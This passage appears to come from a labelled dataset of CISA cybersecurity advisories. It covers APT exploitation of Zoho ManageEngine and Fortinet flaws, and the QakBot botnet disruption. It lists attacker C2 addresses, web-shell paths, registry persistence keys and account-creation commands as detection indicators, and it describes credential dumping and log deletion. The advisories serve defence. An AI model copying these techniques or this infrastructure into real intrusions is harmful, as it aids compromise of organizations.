","{'T1573.002', 'T1003.002', 'T1219', 'T1505.003', 'T1027.009', 'T1588.002', 'TA0010', 'T1553.002', 'T1571', 'T1040', 'T1190', 'T1068', 'T1003.001', 'T1018', 'T1572', 'T1049', 'T1564.001', 'T1564.003', 'T1078.003', 'T1003', 'T1543.003', 'T1046', 'T1057', 'T1570', 'T1133', 'T1012', 'T1583.005', 'T1059.001', 'T1059.007', 'T1036.004', 'TA0009', 'T1074', 'T1136.001', 'T1021.001', 'T1071.001', 'T1587.001', 'T1053.005', 'T1070.001', 'T1036.008'}","






Actions to take today to mitigate malicious cyber activity:




Patch all systems for known exploited vulnerabilities (KEVs), including firewall security appliances.
Monitor for unauthorized use of remote access software using endpoint detection tools.
Remove unnecessary (disabled) accounts and groups from the enterprise that are no longer needed, especially privileged accounts.







SUMMARY
The Cybersecurity and Infrastructure Security Agency (CISA), Federal Bureau of Investigation (FBI), and Cyber National Mission Force (CNMF) identified the presence of indicators of compromise (IOCs) at an Aeronautical Sector organization as early as January 2023. Analysts confirmed that nation-state advanced persistent threat (APT) actors exploited CVE-2022-47966 to gain unauthorized access to a public-facing application (Zoho ManageEngine ServiceDesk Plus), establish persistence, and move laterally through the network. This vulnerability allows for remote code execution on the ManageEngine application. Additional APT actors were also observed exploiting CVE-2022-42475 to establish presence on the organization’s firewall device.
CISA and co-sealers are releasing this joint Cybersecurity Advisory (CSA) to provide network defenders with tactics, techniques, and procedures (TTPs), IOCs, and methods to detect and protect against similar exploitation.
Download the PDF version of this report:


AA23-250A Actors Exploit CVE-2022-47966 and CVE-2022-42475
(PDF,       681.49 KB
  )


For a downloadable copy of IOCs, see:


AA23-250A STIX XML
(XML,       69.24 KB
  )




AA23-250A STIX JSON
(JSON,       69.89 KB
  )


For a downloadable copy of the Malware Analysis Report (MAR) accompanying this CSA, see:


MAR-10430311-1.v1 Multiple Nation-State Threat Actors Exploit CVE-2022-47966 and CVE-2022-42475
(PDF,       385.49 KB
  )


Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 13. See Tables 3-13 for the APT actors’ activity mapped to MITRE ATT&CK tactics and techniques with corresponding mitigation and/or detection recommendations.
Overview
By request of the impacted organization, CISA conducted an incident response engagement from February to April 2023. CISA and co-sealers assess that beginning as early as January 2023, multiple nation-state APT actors were present on the organization’s network via at least two initial access vectors:

Initial Access Vector 1: APT actors exploited CVE-2022-47966 to access the organization’s web server hosting the public-facing application, Zoho ManageEngine ServiceDesk Plus.
Initial Access Vector 2: APT actors exploited CVE-2022-42475 to access the organization’s firewall device.

CISA and co-sealers identified an array of threat actor activity, to include overlapping TTPs across multiple APT actors. Per the activity conducted, APT actors often scan internet-facing devices for vulnerabilities that can be easily exploited. Firewall, virtual private networks (VPNs), and other edge network infrastructure continue to be of interest to malicious cyber actors. When targeted, they can be leveraged to expand targeted network access, serve as malicious infrastructure, or a mixture of both.
APT Actor Activity
Initial Access Vector 1
As early as January 2023, APT actors exploited CVE-2022-47966, for initial access to the organization’s web server hosting the public-facing application, Zoho ManageEngine ServiceDesk Plus. CISA observed indications in log files that a connection to the known malicious IP address 192.142.226,.,153 was made as part of initial exploitation.
Through exploitation of CVE-2022-47966, APT actors achieved root level access on the web server and created a local user account, named Azure with administrative privileges,. Actors were further able to download malware, enumerate the network, collect administrative user credentials, and move laterally through the organization’s network. CISA and co-sealers were unable to determine if proprietary information was accessed, altered, or exfiltrated. This was due to the organization not clearly defining where their data was centrally located and CISA having limited network sensor coverage.
Initial Access Vector 2
Additional APT actors exploited CVE-2022-42475 on the organization’s firewall device, which was indicated by multiple successful VPN connections from known-malicious IPs between February 1-16, 2023. It was identified that APT actors compromised and used disabled, legitimate administrative account credentials, from a previously hired contractor—of which the organization confirmed the user had been disabled prior to the observed activity.
Analysis identified that a common behavior for these threat actors was to use disabled administrative account credentials and delete logs from several critical servers in the environment,. This prevented the ability to detect follow-on exploitation or data exfiltration. CISA and co-sealers were also unable to further track the activity due to the organization not having Network Address Translation (NAT) IP logging enabled.
APT actors initiated multiple Transport Layer Security (TLS)-encrypted sessions, on Transmission Control Protocol (TCP) port 10443, indicating successful exchanges of data transfer from the firewall device. APT actors were observed connecting to the device from the following actor-controlled C2 IP addresses:

144.202.2,.,71
207.246.105,.,240
45.77.121,.,232
47.90.240,.,218

APT actors further leveraged legitimate credentials to move from the firewall to a web server, where multiple web shells were loaded—among other locations, such as the OWA server—into the following directories. Note: The following file paths to these web shells were received in coordination with a trusted third-party; however, the artifacts were not received for analysis.

c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\resource.aspx
c:\inetpub\wwwroot\,REDACTED,\css\font-awesome\css\discover.ashx
c:\inetpub\wwwroot\,REDACTED,\css\font-awesome\css\configlogin.ashx
c:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\15\template\layouts\approveinfo.aspx
c:\Program Files\Microsoft Office Web Apps\RootWebsite\infos.aspx
c:\Program Files\Microsoft Office Web Apps\RootWebsite\errorinfo.aspx
c:\Program Files\Microsoft Office Web Apps\RootWebsite\infos.ashx
c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\error.aspx
c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\infos.aspx
c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\info.aspx
c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\info-1.aspx
c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\new_list.aspx
c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\errorinfo.aspx
c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\lgnbotr.ashx
c:\inetpub\passwordchange\0LECPNJYRH.aspx
c:\inetpub\passwordchange\9ehj.aspx
c:\inetpub\wwwroot\wss\VirtualDirectories\Portal80\_vti_pvt\servicesinfo.ashx
c:\inetpub\wwwroot\wss\VirtualDirectories\Portal80\_vti_pvt\services.aspx
c:\inetpub\redirectedSites\,REDACTED,\products\uns1fw.aspx
c:\inetpub\redirectedSites\,REDACTED,\products\uns1ew.aspx

The following IP addresses were identified as associated with the loaded web shells:

45.90.123,.,194
154.6.91,.,26
154.6.93,.,22
154.6.93,.,5
154.6.93,.,12
154.6.93,.,32
154.6.93,.,24
184.170.241,.,27
191.96.106,.,40
102.129.145,.,232

Forensic Timeline of APT Actor Activity
Tables 1 and 2 list the timeline of events discovered during the incident response, as well as tools used by the APT actors to conduct their operations, respectively. All timestamps are presented in Coordinated Universal Time (UTC).

Post-engagement analysis was extended but analysts were unable to determine additional actions taken by the APT actors, likely due to a lack of sensor coverage and data unavailability. With the data available, it was determined APT actors used the tools listed in Table 2 during their operations.

 
MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 3-13 for all referenced APT actors’ tactics and techniques for enterprise environments in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.

 

 

 

 

 

 

 

 

 

 

 
DETECTION METHODS
CISA and co-sealers recommend reviewing Tables 3-13: Identified ATT&CK Techniques for Enterprise in conjunction with the detections in this section to identify similar activity.

Enable logging for new user creation,DS0002, as well as monitor executed commands and arguments for actions that are associated with local account creation, such as net user /add, useradd, and dscl -create,DS0017,.
Monitor for newly constructed scheduled tasks by enabling the ""Microsoft-Windows-TaskScheduler/Operational"" setting within the event logging service. Monitor for changes made to scheduled tasks that may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools,DS0003,.
Monitor for API calls that may create or modify Windows services (ex: CreateServiceW()) to repeatedly execute malicious payloads as part of persistence,DS0009,.
Monitor executed commands and arguments that may attempt to access credential material stored in the process memory of the LSASS,DS0017,.
Monitor for user accounts logged into systems associated with RDP (ex: Windows EID 4624 Logon Type 10),DS0028,.
Monitor for newly-constructed network connections associated with pings/scans that may attempt to collect a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for lateral movement from the current system,DS0029,.
Conduct full port scans (1-65535) on internet-facing systems—not just a subset of the ports.

MITIGATIONS
Note: These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
Manage Vulnerabilities and Configurations,CPG 1.E, CPG 3.A,
CISA and co-sealers identified that exploitation of CVE-2022-47966 granted initial access to the public-facing application, Zoho ManageEngine ServiceDesk Plus. Multiple Zoho ManageEngine on-premises products, such as ServiceDesk Plus through 14003, allow remote code execution due to use of version 1.4.1 of Apache XML Security for Java (also known as xmlsec) from the Apache Santuario project. Due to the xmlsec XSLT features by design in that version, the application is responsible for certain security protections. CISA and co-sealers recommend the following:

Document device configurations,CPG 2.O,. Organizations should maintain updated documentation describing the current configuration details of all critical IT assets (and OT, where applicable), as this facilitates more effective vulnerability and response activities.
Keep all software up to date and patch systems for known exploited vulnerabilities. In places with known exploited vulnerabilities on an endpoint device (e.g., firewall security appliances), conduct investigation prior to patching,CPG 1.E,.
Follow a routine patching cycle,M1051, for all operating systems, applications, and software (including all third-party software) to mitigate the potential for exploitation.
Prioritize remediation of vulnerabilities on internet-facing systems, for example, by conducting continuous automated and/or routine vulnerability scans,M1016,. CISA offers a range of services at no cost, including scanning and testing to help organizations reduce exposure to threats via mitigating attack vectors. Specifically, Cyber Hygiene services can help provide a second-set of eyes on organizations' internet-accessible assets. Organizations can email vulnerability@cisa.dhs.gov with the subject line, “Requesting Cyber Hygiene Services” to get started. For additional guidance on remediating these vulnerabilities, see CISA Insights - Remediate Vulnerabilities for Internet-Accessible Systems.
Deploy security.txt files,CPG 4.C,. All public-facing web domains have a security.txt file that conforms to the recommendations in RFC 9116.,9,

Segment Networks,CPG 2.F,
CISA and co-sealers identified that the organization did not employ proper network segmentation, such as a demilitarized zone (DMZ), during the initial discovery phase of the incident response. A DMZ serves as a perimeter network that protects and adds an extra layer of security to an organization’s internal local area network (LAN) from untrusted traffic.

Employ proper network segmentation, such as a DMZ, and ensure to address the following recommendations. Note: The end goal of a DMZ network is to allow an organization to access untrusted networks, such as the internet, while ensuring its private network or LAN remains secure. Organizations typically store external-facing services and resources, as well as servers for DNS, File Transfer Protocol (FTP), mail, proxy, Voice over Internet Protocol (VoIP), and web servers in the DMZ,CPG 2.K, CPG 2.W,.

Limit internet-facing port exposure for critical resources in the DMZ networks.
Limit exposed ports to only required IP addresses and avoid placing wildcards in destination port or host entries.
Ensure unsecured protocols like FTP and HTTP are limited in use and restricted to specific IP ranges.
If data flows from untrusted zone to trusted zone, ensure it is conducted over a secure protocol like HTTPS with mandatory multi-factor authentication.


Use a firewall or web-application firewall (WAF) and enable logging to prevent/detect potential exploitation attempts,M1050,. Review ingress and egress firewall rules and block all unapproved protocols. Limit risky (but approved) protocols through rules.

Use WAF to limit exposure to just approved ports, as well as monitor file changes in web directories.


Implement network segmentation to separate network segments based on role and functionality. Proper network segmentation significantly reduces the ability for threat actor lateral movement by controlling traffic flows between—and access to—various subnetworks. See CISA’s Layering Network Security Through Segmentation infographic and the National Security Agency’s (NSA’s) Segment Networks and Deploy Application-Aware Defenses.

Manage Accounts, Permissions, and Workstations
APT actors were able to leverage disabled administrative accounts, as well as clear logs on several critical servers, which prevented the ability to detect follow-on exploitation or data exfiltration. CISA and co-sealers recommend the following:

Use phishing-resistant multi-factor authentication (MFA),CPG 2.H, (e.g., security tokens) for remote access and access to any sensitive data repositories. Implement phishing-resistant MFA for as many services possible—particularly for webmail and VPNs—for accounts that access critical systems and privileged accounts that manage backups. MFA should also be used for remote logins,M1032,. For additional guidance on secure MFA configurations, visit cisa.gov/MFA and CISA’s Implementing Phishing-Resistant MFA Factsheet.
Employ strong password management alongside other attribute-based information, such as device information, time of access, user history, and geolocation data. Set a password policy to require complex passwords for all users (minimum of 16 characters) and enforce this new requirement as users’ passwords expire,CPG 2.A, CPG 2.B, CPG 2.C,.
Implement the principle of least privilege to decrease threat actors’ abilities to access key network resources.
Limit the ability of a local administrator account to log in from a local interactive session,CPG 2.E, (e.g., “Deny access to this computer from the network”) and prevent access via an RDP session.
Establish policy and procedure for the prompt removal of unnecessary (disabled) accounts and groups from the enterprise that are no longer needed, especially privileged accounts. Implement and enforce use of Local Administrator Password Solution (LAPS).
Control and limit local administration, ensuring administrative users do not have access to other systems outside of the local machine and across the domain.
Create a change control process for all privilege escalations and role changes on user accounts. Enable alerts on privilege escalations and role changes, as well as log privileged user changes in the network environment and create alerts for abnormal events.
Create and deploy a secure system baseline image to all workstations. See Microsoft’s guidance on Using Security Baselines in Your Organization.
Implement policies to block workstation-to-workstation RDP connections,CPG 2.V, through a Group Policy Object on Windows, or by a similar mechanism. The RDP service should be disabled if it is unnecessary,M1042,.

Secure Remote Access Software
Remote access software provides a proactive and flexible approach for organizations to internally oversee networks, computers, and other devices; however, cyber threat actors increasingly co-opt these tools for access to victim systems. APT actors were observed using legitimate remote access tools—ConnectWise ScreenConnect and AnyDesk—to connect to victim hosts within the organization’s environment and further conduct malicious operations. CISA and co-sealers recommend the following:

Establish a software behavior baseline to detect anomalies in behavior,CPG 2.T, CPG 2.U,.
Monitor for unauthorized use of remote access software using endpoint detection tools.

For more information, see CISA’s joint Guide to Securing Remote Access Software on best practices for using remote capabilities and how to detect and defend against malicious actors abusing this software.
Other Best Practice Mitigation Recommendations

Use application allowlists on domain controllers, administrative hosts, and other sensitive systems. Following exploitation of the public-facing application (Zoho ManageEngine ServiceDesk Plus), APT actors were able to download and execute multiple files on the system, which were then utilized to enumerate the network and perform reconnaissance operations.

Use directory allowlisting rather than attempting to list every possible permutation of applications in a network environment. Safe defaults allow applications to run from PROGRAMFILES, PROGRAMFILES(X86), and SYSTEM32. Disallow all other locations unless an exception is granted and documented. Application directory allowlisting can be enabled through Microsoft Software Restriction Policy or AppLocker and can prevent the execution of unauthorized software.


Audit scheduled tasks and validate all findings via a Group Policy Object (GPO) or endpoint detection and response (EDR) solution.
Follow Microsoft’s Best Practices for Securing Active Directory.
Review NSA’s Network Infrastructure Security Guide.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA and co-sealers recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA and co-sealers also recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 3-13).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA and co-sealers recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

NIST: NVD CVE-2022-47966
NIST: NVD CVE-2022-42475
CISA: KEV List
MITRE ATT&CK for Enterprise v13.1
CISA, MITRE: Best Practices for MITRE ATT&CK Mapping
CISA: Decider Tool
CISA: Cross-Sector Cybersecurity Performance Goals
CISA: Cyber Hygiene Services
CISA: Remediate Vulnerabilities for Internet-Accessible Systems
CISA: Layering Network Security Through Segmentation
NSA: Segment Networks and Deploy Application-Aware Defenses
CISA: MFA
CISA: Implementing Phishing-Resistant MFA
Microsoft: Using Security Baselines in Your Organization
CISA: Guide to Securing Remote Access Software
Microsoft: Best Practices for Securing Active Directory
NSA: Network Infrastructure Security Guide

DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA, the FBI, and CNMF do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA, the FBI, or CNMF.
REFERENCES

Snort: Known Malicious User-Agent String – Mirai
MITRE: Mimikatz
MITRE: Ngrok
AA22-320A: Iranian Government-Sponsored APT Actors Compromise Federal Network, Deploy Crypto Miner, Credential Harvester
AA22-294A: #StopRansomware: Daixin Team
AA23-075A: #StopRansomware: LockBit 3.0
GitHub: Interactsh
Microsoft: Quser
Internet Engineering Task Force (IETF): RFC 9116

VERSION HISTORY
September 7, 2023: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-250a
20,"



SUMMARY
The Cybersecurity and Infrastructure Security Agency (CISA) and Federal Bureau of Investigation (FBI) are releasing this joint Cybersecurity Advisory (CSA) to disseminate QakBot infrastructure indicators of compromise (IOCs) identified through FBI investigations as of August 2023. On August 25, FBI and international partners executed a coordinated operation to disrupt QakBot infrastructure worldwide. Disruption operations targeting QakBot infrastructure resulted in the botnet takeover, which severed the connection between victim computers and QakBot command and control (C2) servers. The FBI is working closely with industry partners to share information about the malware to maximize detection, remediation, and prevention measures for network defenders.
CISA and FBI encourage organizations to implement the recommendations in the Mitigations section to reduce the likelihood of QakBot-related activity and promote identification of QakBot-facilitated ransomware and malware infections. Note: The disruption of QakBot infrastructure does not mitigate other previously installed malware or ransomware on victim computers. If potential compromise is detected, administrators should apply the incident response recommendations included in this CSA and report key findings to a local FBI Field Office or CISA at cisa.gov/report.
Download the PDF version of this report:


AA23-242A Identification and Disruption of QakBot Infrastructure
(PDF,       570.50 KB
  )


For a downloadable copy of IOCs, see:


AA23-242A STIX XML
(XML,       51.62 KB
  )




AA23-242A STIX JSON
(JSON,       43.12 KB
  )


TECHNICAL DETAILS
Overview
QakBot—also known as Qbot, Quackbot, Pinkslipbot, and TA570—is responsible for thousands of malware infections globally. QakBot has been the precursor to a significant amount of computer intrusions, to include ransomware and the compromise of user accounts within the Financial Sector. In existence since at least 2008, QakBot feeds into the global cybercriminal supply chain and has deep-rooted connections to the criminal ecosystem. QakBot was originally used as a banking trojan to steal banking credentials for account compromise; in most cases, it was delivered via phishing campaigns containing malicious attachments or links to download the malware, which would reside in memory once on the victim network.
Since its initial inception as a banking trojan, QakBot has evolved into a multi-purpose botnet and malware variant that provides threat actors with a wide range of capabilities, to include performing reconnaissance, engaging in lateral movement, gathering and exfiltrating data, and delivering other malicious payloads, including ransomware, on affected devices. QakBot has maintained persistence in the digital environment because of its modular nature. Access to QakBot-affected (victim) devices via compromised credentials are often sold to further the goals of the threat actor who delivered QakBot.
QakBot and affiliated variants have targeted the United States and other global infrastructures, including the Financial Services, Emergency Services, and Commercial Facilities Sectors, and the Election Infrastructure Subsector. FBI and CISA encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood of QakBot-related infections and promote identification of QakBot-induced ransomware and malware infections. Disruption of the QakBot botnet does not mitigate other previously installed malware or ransomware on victim computers. If a potential compromise is detected, administrators should apply the incident response recommendations included in this CSA and report key findings to CISA and FBI.
QakBot Infrastructure
QakBot’s modular structure allows for various malicious features, including process and web injection, victim network enumeration and credential stealing, and the delivery of follow-on payloads such as Cobalt Strike[1], Brute Ratel, and other malware. QakBot infections are particularly known to precede the deployment of human-operated ransomware, including Conti[2], ProLock[3], Egregor[4], REvil[5], MegaCortex[6], Black Basta[7], Royal[8], and PwndLocker.
Historically, QakBot’s C2 infrastructure relied heavily on using hosting providers for its own infrastructure and malicious activity. These providers lease servers to malicious threat actors, ignore abuse complaints, and do not cooperate with law enforcement. At any given time, thousands of victim computers running Microsoft Windows were infected with QakBot—the botnet was controlled through three tiers of C2 servers.

 

Figure 1: QakBot’s Tiered C2 Servers

The first tier of C2 servers includes a subset of thousands of bots selected by QakBot administrators, which are promoted to Tier 1 “supernodes” by downloading an additional software module. These supernodes communicate with the victim computers to relay commands and communications between the upstream C2 servers and the infected computers. As of mid-June 2023, 853 supernodes have been identified in 63 countries, which were active that same month. Supernodes have been observed frequently changing, which assists QakBot in evading detection by network defenders. Each bot has been observed communicating with a set of Tier 1 supernodes to relay communications to the Tier 2 C2 servers, serving as proxies to conceal the main C2 server. The Tier 3 server controls all of the bots.
Indicators of Compromise
FBI has observed the following threat actor tactics, techniques, and procedures (TTPs) in association with OakBot infections:

QakBot sets up persistence via the Registry Run Key as needed. It will delete this key when running and set it back up before computer restart: HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\<random_string>
QakBot will also write its binary back to disk to maintain persistence in the following folder: C:\Users\<user>\AppData\Roaming\Microsoft\<random_string>\
QakBot will write an encrypted registry configuration detailing information about the bot to the following registry key: HKEY_CURRENT_USER\Software\Microsoft\<random_string>

In addition, the below IP addresses were assessed to have obtained access to victim computers. Organizations are encouraged to review any connections with these IP addresses, which could potentially indicate a QakBot and/or follow-on malware infection.
Disclaimer: The below IP addresses are assessed to be inactive as of August 29, 2023. Several of these observed IP addresses were first observed as early as 2020, although most date from 2022 or 2023, and have been historically linked to QakBot. FBI and CISA recommend these IP addresses be investigated or vetted by organizations prior to taking action, such as blocking.

Table 1: IPs Affiliated with QakBot Infections


IP Address
First Seen




85.14.243[.]111
April 2020


51.38.62[.]181
April 2021


51.38.62[.]182
December 2021


185.4.67[.]6
April 2022


62.141.42[.]36
April 2022


87.117.247[.]41
May 2022


89.163.212[.]111
May 2022


193.29.187[.]57
May 2022


193.201.9[.]93
June 2022


94.198.50[.]147
August 2022


94.198.50[.]210
August 2022


188.127.243[.]130
September 2022


188.127.243[.]133
September 2022


94.198.51[.]202
October 2022


188.127.242[.]119
November 2022


188.127.242[.]178
November 2022


87.117.247[.]41
December 2022


190.2.143[.]38
December 2022


51.161.202[.]232
January 2023


51.195.49[.]228
January 2023


188.127.243[.]148
January 2023


23.236.181[.]102
Unknown


45.84.224[.]23
Unknown


46.151.30[.]109
Unknown


94.103.85[.]86
Unknown


94.198.53[.]17
Unknown


95.211.95[.]14
Unknown


95.211.172[.]6
Unknown


95.211.172[.]7
Unknown


95.211.172[.]86
Unknown


95.211.172[.]108
Unknown


95.211.172[.]109
Unknown


95.211.198[.]177
Unknown


95.211.250[.]97
Unknown


95.211.250[.]98
Unknown


95.211.250[.]117
Unknown


185.81.114[.]188
Unknown


188.127.243[.]145
Unknown


188.127.243[.]147
Unknown


188.127.243[.]193
Unknown


188.241.58[.]140
Unknown


193.29.187[.]41
Unknown



Organizations are also encouraged to review the Qbot/QakBot Malware presentation from the U.S. Department of Health & Human Services Cybersecurity Program for additional information.
MITRE ATT&CK TECHNIQUES
For detailed associated software descriptions, tactics used, and groups that have been observed using this software, see MITRE ATT&CK’s page on QakBot.[9]
MITIGATIONS
Note: For situational awareness, the following SHA-256 hash is associated with FBI’s QakBot uninstaller: 7cdee5a583eacf24b1f142413aabb4e556ccf4ef3a4764ad084c1526cc90e117
CISA and FBI recommend network defenders apply the following mitigations to reduce the likelihood of QakBot-related activity and promote identification of QakBot-induced ransomware and malware infections. Disruption of the QakBot botnet does not mitigate other already-installed malware or ransomware on victim computers. Note: These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats and TTPs. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
Best Practice Mitigation Recommendations

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud) [CPG 2.O, 2.R, 5.A].
Require all accounts with password logins (e.g., service accounts, admin accounts, and domain admin accounts) to comply with NIST’s standards when developing and managing password policies [CPG 2.B]. This includes:

Use longer passwords consisting of at least 8 characters and no more than 64 characters in length;
Store passwords in hashed format using industry-recognized password managers;
Add password user “salts” to shared login credentials;
Avoid reusing passwords;
Implement multiple failed login attempt account lockouts;
Disable password “hints”;
Refrain from requiring password changes more frequently than once per year.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Use phishing-resistant multi-factor authentication (MFA) [CPG 2.H] (e.g., security tokens) for remote access and access to any sensitive data repositories. Implement phishing-resistant MFA for as many services as possible—particularly for webmail and VPNs—for accounts that access critical systems and privileged accounts that manage backups. MFA should also be used for remote logins. For additional guidance on secure MFA configurations, visit cisa.gov/MFA and CISA’s Implementing Phishing-Resistant MFA Factsheet.
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities of internet-facing systems [CPG 1.E]. CISA offers a range of services at no cost, including scanning and testing to help organizations reduce exposure to threats via mitigating attack vectors. Specifically, Cyber Hygiene services can help provide a second-set of eyes on organizations’ internet-accessible assets. Organizations can email vulnerability@cisa.dhs.gov with the subject line, “Requesting Cyber Hygiene Services” to get started.
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks to restrict adversary lateral movement [CPG 2.F].
Identify, detect, and investigate abnormal activity and potential traversal of the indicated malware with a networking monitoring tool. To aid in detecting the malware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host [CPG 3.A].
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege [CPG 2.D, 2.E].
Disable unused ports [CPG 2.V, 2.W, 2X].
Consider adding an email banner to emails received from outside your organization.
Disable hyperlinks in received emails.
Implement time-based access for accounts set at the admin level and higher. For example, the Just-in-Time access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task [CPG 2.E].
Disable command-line and scripting activities and permissions. Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally.
Perform regular secure system backups and create known good copies of all device configurations for repairs and/or restoration. Store copies off-network in physically secure locations and test regularly [CPG 2.R].
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure.

Ransomware Guidance

CISA.gov/stopransomware is a whole-of-government resource that serves as one central location for ransomware resources and alerts.
CISA, FBI, the National Security Agency (NSA), and Multi-State Information Sharing and Analysis Center (MS-ISAC) published an updated version of the #StopRansomware Guide, as ransomware actors have accelerated their tactics and techniques since its initial release in 2020.
CISA has released a new module in its Cyber Security Evaluation Tool (CSET), the Ransomware Readiness Assessment (RRA). CSET is a desktop software tool that guides network defenders through a step-by-step process to evaluate cybersecurity practices on their networks.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA and FBI recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA and FBI also recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see MITRE ATT&CK’s page on QakBot).[9]
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA and FBI recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques.
REPORTING
FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with QakBot-affiliated actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. FBI and CISA do not encourage paying ransom, as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field Office or CISA at cisa.gov/report.
RESOURCES

HHS: Qbot/QakBot Malware
CISA: CPGs
NIST: 800-63B Digital Identity Guidelines
CISA: MFA
CISA: Implementing Phishing-Resistant MFA
CISA: Known Exploited Vulnerabilities Catalog
CISA: Cyber Hygiene
CISA: Zero Trust
CISA: #StopRansomware
CISA: #StopRansomware Guide
CISA: CSET Tool Sets Sights on Ransomware Threat

REFERENCES

MITRE: Cobalt Strike
MITRE: Conti
MITRE: ProLock
MITRE: Egregor
MITRE: REvil
MITRE: MegaCortex
MITRE: Black Basta
MITRE: Royal
MITRE: QakBot

DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA and FBI do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA and FBI.
VERSION HISTORY
August 30, 2023: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


",set(),"



SUMMARY
The Cybersecurity and Infrastructure Security Agency (CISA) and Federal Bureau of Investigation (FBI) are releasing this joint Cybersecurity Advisory (CSA) to disseminate QakBot infrastructure indicators of compromise (IOCs) identified through FBI investigations as of August 2023. On August 25, FBI and international partners executed a coordinated operation to disrupt QakBot infrastructure worldwide. Disruption operations targeting QakBot infrastructure resulted in the botnet takeover, which severed the connection between victim computers and QakBot command and control (C2) servers. The FBI is working closely with industry partners to share information about the malware to maximize detection, remediation, and prevention measures for network defenders.
